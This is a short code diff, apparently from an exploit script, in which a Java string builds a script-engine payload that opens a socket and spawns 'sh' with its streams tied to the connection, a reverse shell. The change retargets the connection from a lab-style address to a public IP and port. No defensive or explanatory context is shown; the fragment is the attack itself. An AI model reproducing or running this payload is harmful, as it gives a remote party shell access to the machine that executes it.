@@ -1,5 +1,5 @@
-String command = "var host = '10.10.10.10';" +
-                       "var port = 9001;" +
+String command = "var host = '146.190.230.201';" +
+                       "var port = 8000;" +
                        "var cmd = 'sh';"+
                        "var s = new java.net.Socket(host, port);" +
                        "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
